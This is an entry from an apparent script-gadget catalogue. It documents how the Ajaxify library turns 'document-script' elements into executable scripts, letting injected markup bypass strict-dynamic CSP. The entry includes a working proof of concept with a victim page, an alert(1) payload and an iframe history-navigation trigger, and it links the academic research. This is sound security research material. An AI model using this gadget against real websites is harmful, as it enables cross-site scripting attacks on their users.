---
description: Ajaxify your entire website instantly with this simple drop-in script using the HTML5 History API with [History.js](https://github.com/browserstate/history.js) and [jQuery ScrollTo](https://github.com/flesler/jquery-scrollTo).
github: browserstate/ajaxify
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - id-attr
      - class-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Ajaxify](https://github.com/browserstate/ajaxify) library converts all `document-script` elements to a `<script>` elements.
        code: |
          <!-- victim website -->
          <html>
          <head>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-scrollTo/2.1.3/jquery.scrollTo.min.js"></script>
            <script src="https://browserstate.github.io/history.js/scripts/bundled/html4+html5/jquery.history.js"></script>
            <script src="https://rawgithub.com/browserstate/ajaxify/master/ajaxify-html5.js"></script>
          </head>
          <body>

          <!-- user input -->
          <div id="content">
            <div class="document-script">alert(1)</div>
          </div>

          </body>
          </html>

          <!-- attacker website -->
          <iframe src="http://victim/"></iframe>

          <script>
            var frame = document.querySelector("iframe");
            var url = frame.src;
            setTimeout(function() { frame.src = frame.src + "#foo" }, 1000);
            setTimeout(function() { frame.src = frame.src.substring(0, frame.src.length -4) }, 2000);
            setTimeout(function() { history.back() }, 3000);
            setTimeout(function() { history.back() }, 4000);
          </script>
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/browserstate/ajaxify/blob/f086e25d691f0a2da39427369063c4324c134d7d/ajaxify-html5.js#L129">https://github.com/browserstate/ajaxify/blob/f086e25d691f0a2da39427369063c4324c134d7d/ajaxify-html5.js#L129</a>

      ```javascript
      $scripts = $dataContent.find('.document-script');
      if ( $scripts.length ) {
        $scripts.detach();
      }

      // [...]

      $scripts.each(function(){
        var $script = $(this), scriptText = $script.text(), scriptNode = document.createElement('script');
        if ( $script.attr('src') ) {
          if ( !$script[0].async ) { scriptNode.async = false; }
          scriptNode.src = $script.attr('src');
        }
            scriptNode.appendChild(document.createTextNode(scriptText));
        contentNode.appendChild(scriptNode);
      });
      ```
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ajaxify.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ajaxify_exploit.php
---
